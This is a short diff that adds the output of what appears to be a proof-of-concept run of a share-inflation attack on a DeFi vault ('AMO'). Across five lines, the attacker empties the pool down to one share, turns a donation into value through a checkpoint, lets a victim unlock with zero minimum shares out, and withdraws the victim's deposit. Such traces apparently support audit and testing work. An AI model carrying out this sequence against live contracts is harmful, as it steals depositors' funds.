@@ -1,0 +1,5 @@
+attacker unlock(0) on empty AMO      -> ('ok', 5005422544025340752)
+attacker withdraw(all but 1 wei share) -> ('ok', (5005422543251257462, 5005422544025340751))  totalSupply = 1
+attacker checkpoint() converting donation -> ok  debtBalance=1001073167094537453821 lp=1001073167093104825510
+victim unlock(minShareOut=0)          -> ('ok', 0) {'debtOut': 500528166880622196786, 'debtBal': 1501601333975159650607, 'wrapped': False, 'dsh': 0, 'lsh': 0}
+attacker withdraw(1 share)            -> ('ok', (1501601333971650186329, 1501601333975159650607))
